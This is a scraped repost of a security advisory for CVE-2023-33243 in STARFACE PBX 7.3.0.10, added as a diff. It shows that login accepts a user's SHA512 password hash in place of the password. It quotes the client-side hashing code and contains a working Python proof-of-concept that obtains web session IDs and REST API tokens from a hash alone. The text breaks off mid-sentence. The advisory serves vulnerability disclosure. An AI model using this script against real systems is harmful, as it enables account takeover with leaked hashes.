@@ -1,0 +1,232 @@
+---
+title: [webapps] STARFACE 7.3.0.10 - Authentication with Password Hash Possible
+url: https://buaq.net/go-167185.html
+source: unSafe.sh - 不安全
+date: 2023-06-05
+fetch_date: 2025-10-04T11:44:40.945406
+---
+
+# [webapps] STARFACE 7.3.0.10 - Authentication with Password Hash Possible
+
+* [unSafe.sh - 不安全](https://unsafe.sh)
+* [我的收藏](/user/collects)
+* [今日热榜](/?hot=true)
+* [公众号文章](/?gzh=true)
+* [导航](/nav/index)
+* [Github CVE](/cve)
+* [Github Tools](/tools)
+* [编码/解码](/encode)
+* [文件传输](/share/index)
+* [Twitter Bot](https://twitter.com/buaqbot)
+* [Telegram Bot](https://t.me/aqinfo)
+* [Search](/search/search)
+
+[Rss](/rss.xml)
+
+[ ]
+黑夜模式
+
+![]()
+
+[webapps] STARFACE 7.3.0.10 - Authentication with Password Hash Possible
+
+*2023-6-4 08:0:0
+Author: [www.exploit-db.com(查看原文)](/jump-167185.htm)
+阅读量:19
+收藏*
+
+---
+
+#### Platform:
+
+###### [JSP](https://www.exploit-db.com/?platform=jsp)
+
+#### Date:
+
+###### 2023-06-04
+
+```
+Exploit Title: STARFACE 7.3.0.10 - Authentication with Password Hash Possible
+Affected Versions: 7.3.0.10 and earlier versions
+Fixed Versions: -
+Vulnerability Type: Broken Authentication
+Security Risk: low
+Vendor URL: https://www.starface.de
+Vendor Status: notified
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2022-004
+Advisory Status: published
+CVE: CVE-2023-33243
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33243
+
+Introduction
+============
+
+"When functionality and comfort come together, the result is a
+state-of-the-art experience that we've dubbed 'comfortphoning'. It's a
+secure, scalable digital communication solution that meets every need
+and wish. STARFACE is easy to integrate into existing IT systems and
+flexibly grows with your requirements."
+
+(from the vendor's homepage)
+
+More Details
+============
+
+The image of STARFACE PBX [0] in version 7.3.0.10 can be downloaded from
+the vendor's homepage [1]. The included files can be further examined by
+either extracting the contents or running the image in a virtual
+machine. The web interface of the PBX uses the JavaScript file at the
+following path to submit the login form:
+
+------------------------------------------------------------------------
+js/prettifier.js
+------------------------------------------------------------------------
+
+The following two lines of the JavaScript file "prettifier.js" add the
+two parameters "secret" and "ack" to the form before being submitted:
+
+------------------------------------------------------------------------
+$form(document.forms[0]).add('secret', createHash(defaultVals.isAd, liv, lpv, defaultVals.k + defaultVals.bk));
+$form(document.forms[0]).add('ack', defaultVals.k);
+------------------------------------------------------------------------
+
+The JavaScript object "defaultVals" is included in the web application's
+source text. While the value of "defaultVals.k" was found to be the
+static hash of the PBX version, the value of "defaultVals.bk" contains a
+nonce only valid for the currently used session. Therefore, the form
+parameter "ack" is always the same value. For the form value "secret"
+the function "createHash()" is called with different arguments. The
+value of "defaultVals.isAd" is set to "false" when login via Active
+Directory is disabled. The parameters "liv" and "lpv" contain the
+username and password entered into the form respectively.
+
+------------------------------------------------------------------------
+const createHash = function (isAD, user, pass, nonces) {
+    if (isAD) {
+        return forAD.encode(user + nonces + pass);
+    }
+    return user + ':' + forSF(user + nonces + forSF(pass));
+};
+------------------------------------------------------------------------
+
+The expression right after the second return statement is the
+implementation used when Active Directory login is disabled which is the
+default setting. The return value is composed of the username separated
+via a colon from a value built using the "forSF()" function. The
+"forSF()" function was found to calculate the SHA512 hash value. When
+considering the arguments passed to the function, the hash is calculated
+as follows:
+
+------------------------------------------------------------------------
+SHA512(username + defaultVals.k + defaultVals.bk + SHA512(password))
+------------------------------------------------------------------------
+
+As can be seen, instead of the cleartext password the SHA512 hash of the
+password is used in the calculation. In conclusion, for the form value
+"secret" the following value is transmitted:
+
+------------------------------------------------------------------------
+username + ":" + SHA512(
+  username + defaultVals.k + defaultVals.bk + SHA512(password)
+)
+------------------------------------------------------------------------
+
+If the SHA512 hash of a user's password is known, it can be directly
+used in the calculation of the "secret" during the login process.
+Knowledge of the cleartext password is not required.
+
+This finding was also verified by analysing the decompiled Java code of
+the server component. It was also found that the authentication process
+of the REST API is vulnerable in a very similar manner.
+
+Proof of Concept
+================
+
+The following Python script can be used to perform a login by specifying
+a target URL, a username and the associated password hash:
+
+------------------------------------------------------------------------
+#!/usr/bin/env python3
+
+import click
+import hashlib
+import re
+import requests
+import typing
+
+def get_values_from_session(url, session) -> typing.Tuple[str, str]:
+    k, bk = "", ""
+    response_content = session.get(f"{url}/jsp/index.jsp").text
+    k_result = re.search("\sk : '([^']+)'", response_content)
+    bk_result = re.search("\sbk : '([^']+)'", response_content)
+    if k_result != None:
+        k = k_result.group(1)
+    if bk_result != None:
+        bk = bk_result.group(1)
+    return k, bk
+
+def web_login(url, login, pwhash, session) -> bool:
+    version, nonce = get_values_from_session(url, session)
+    if version == "" or nonce == "":
+        print("Web Login failed: Nonce and version hash can not be retrieved.")
+        return
+    value = login + version + nonce + pwhash
+    secret = hashlib.sha512(value.encode("utf-8")).hexdigest()
+    data = {
+        "forward": "",
+        "autologin": "false",
+        "secret": f"{login}:{secret}",
+        "ack": version,
+    }
+    login_request = session.post(
+        f"{url}/login",
+        data=data,
+        allow_redirects=False,
+        headers={"Referer": f"{url}/jsp/index.jsp"},
+    )
+    response_headers = login_request.headers
+    if "Set-Cookie" in response_headers:
+        session_id = response_headers["Set-Cookie"].split("=")[1].split(";")[0]
+        print(f"Session ID: {session_id}")
+        return True
+    else:
+        print("Invalid login data")
+        return False
+
+def get_nonce_from_api(url, session) -> str:
+    response_content = session.get(f"{url}/rest/login").json()
+    return response_content["nonce"] if "nonce" in response_content else ""
+
+def rest_login(url, login, pwhash, session):
+    nonce = get_nonce_from_api(url, session)
+    if nonce == "":
+        print("REST Login failed: Nonce can not be retrieved.")
+        return
+    value = login + nonce + pwhash
+    secret = hashlib.sha512(value.encode("utf-8")).hexdigest()
+    data = {"loginType": "Internal", "nonce": nonce, "secret": f"{login}:{secret}"}
+    login_request = session.post(
+        f"{url}/rest/login",
+        json=data,
+        headers={"Content-Type": "application/json", "X-Version": "2"},
+    )
+    response_data = login_request.json()
+    token = response_data["token"] if "token" in response_data else "none"
+    print(f"REST API Token: {token}")
+
+@click.command()
+@click.option('--url', help='Target System URL', required=True)
+@click.option('--login', help='Login ID', required=True)
+@click.option('--pwhash', help='Password Hash', required=True)
+def login(url, login, pwhash):
+    session = requests.session()
+    stripped_url = url.rstrip("/")
+    result = web_login(stripped_url, login, pwhash, session)
+    if result:
+        rest_login(stripped_url, login, pwhash, session)
+
+if __name__ == "__main__":
+    login()
+------------------------------------------------------------------------
+
+For example, the SHA512 hash of the password "star...
